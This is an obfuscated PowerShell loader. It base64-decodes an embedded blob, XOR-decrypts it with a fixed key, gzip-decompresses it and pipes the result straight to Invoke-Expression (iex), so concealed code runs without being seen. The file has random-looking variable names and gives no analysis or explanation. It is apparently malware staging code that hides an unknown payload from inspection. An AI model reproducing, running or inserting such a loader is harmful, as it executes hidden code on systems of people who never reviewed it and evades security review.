$tk83i2z1456r0jv = [System.Text.Encoding]::ascii
function nqrjx0fy692pgwvs1h8iold3c4m  {param($4olyngwz0j2f7bs )
  $tmad4xwurhi1csb = [System.Convert]::FromBase64String($4olyngwz0j2f7bs)
  $xcn2dgvpf3t14oq= $tk83i2z1456r0jv.GetBytes("lg97hx64nb8d")
    $y0ctar1ndz6v48o = $tmad4xwurhi1csb
    $khod53i1xe2gapb = $(for ($nj1yfhlv96dw2eq = 0; $nj1yfhlv96dw2eq -lt $y0ctar1ndz6v48o.length; ) {
        for ($md4bejsp1vlkxwn = 0; $md4bejsp1vlkxwn -lt $xcn2dgvpf3t14oq.length; $md4bejsp1vlkxwn++) {
            $y0ctar1ndz6v48o[$nj1yfhlv96dw2eq] -bxor $xcn2dgvpf3t14oq[$md4bejsp1vlkxwn]
            $nj1yfhlv96dw2eq++
            if ($nj1yfhlv96dw2eq -ge $y0ctar1ndz6v48o.Length) {
                $md4bejsp1vlkxwn = $xcn2dgvpf3t14oq.length
            }
        }
    })
	$ly9c5knxwiq32h8 = New-Object System.IO.MemoryStream( , $khod53i1xe2gapb )

	    $8ms57tj1bnkx30o = New-Object System.IO.MemoryStream
        $bj7cdq6lhasegm2 = New-Object System.IO.Compression.GzipStream $ly9c5knxwiq32h8, ([IO.Compression.CompressionMode]::Decompress)
	    $bj7cdq6lhasegm2.CopyTo( $8ms57tj1bnkx30o )
        $bj7cdq6lhasegm2.Close()
		$ly9c5knxwiq32h8.Close()
		[byte[]] $t5zd3lak4i7msq2 = $8ms57tj1bnkx30o.ToArray()
 $q0svc98m1oykef4=$t5zd3lak4i7msq2
    return $q0svc98m1oykef4
}
[byte[]]$4pmxvblf5jgorts=nqrjx0fy692pgwvs1h8iold3c4m $sdhnptoke6u02b5
[System.Text.Encoding]::ascii.GetString((nqrjx0fy692pgwvs1h8iold3c4m "c+wxN2h4NjRqYrUxAQjiAXiGCjeUbT+mL4uAJYy8++5qnFjDJoUU+ZoamumywphBNsUaZkIxb0Jdnc/5MvsBRVc8NBCfGkSK1YC3o7lIxqrJoO1YescFCfeJ4n9v/LRijPJpfssuZXO6iZXWOGGF3MKhDVwoLj/Vu0mEreKCX9Q9ivuQEsoNvMRxbV2lc1aIHYYGq/Qo00YAPwhZMAyfbUyc6OhhBLr1GikYcIkLXmHWAoqLLN/D18X7E105BrI0WU1WPhHXE240OYfXNEug44AJGNcGKi1fgjIXQpwOo9QIqYnd2jp0Uj8ACbr53zeVt1TntMZ4j3iT4s50xL6j8HpdJr+AGCbgp+j+aR7wDMCvXL1Zx37TCl4u/rDB4WsMr+ldEgKcw1ICw6qKXhtlUso6m29ltpL+ow9MmCafI8qhFqGylVm5DjNZpxmW1jaePGSVmocMaPt5r4rD5ajPAtFShOwNPjy9e8Kvy4NNraMPl4FN1pDgizu1gUKLFHGxY9x2/hxS8wfGs+B8w5DSf0A19eQGXq131xAwVFzipD4BvFfl1e+Atz6zaCm39L2r4wrRd2OUY5v17edr2oTaVZRDuMttRlK6TSUlthFukXYtlSi0kkwFerX4/LOI1XV/ZnKjxOySNs7Kq/yW6EGwcF2FbPJJJBsemF/viBiCk8QZIfbgelNbyutUvqFQiiQ8AKI3u+4cZ4gKRH9hzeeiD4vjmYs369JyJySXBib5g7m+Q+5r8vdFDfvA5vh/w+EvzrJLIaanGcg2CG3R71KwHJXpzAmI6r/mKlVZ6YxBpghuY8sLdsFVOGu0WwlPvePduuLbmT/dseu6kfStVgZZZc0gAj+5IpLqdJq8cDjsfpJ6dOlei0Zq8mRBAy69uNTbUP6aNF72heb82EJ2E4WrjlLu3WInkSUwJvcPNajWQpEtA/QBwuuc2S//j+JqH2aOLK23VlZOxv+h4sQVWnXamQX3Wakhdfu6lZ5ZUzcd2PHLnffz3zz+ijFEuDPQH924sb2aDJ2d5PuQFi6q2VSN8Ou022lhJS+AiVsOLSHkB51sdL5ENAG3p771uidS9++/ZnerxKhvruOmbrDXJt99lUbD8vZQdb+Au9EqQVqxGZdfcPOc/f6mFFbWSBjX2pEC3meMR3Qat9RddX/js/e6vNIvJ/tKwSJvVPdHLUmUI/MQmGHMHqQsrPvvDcbaVsVrBZYjuDd/NjQ="))|iex;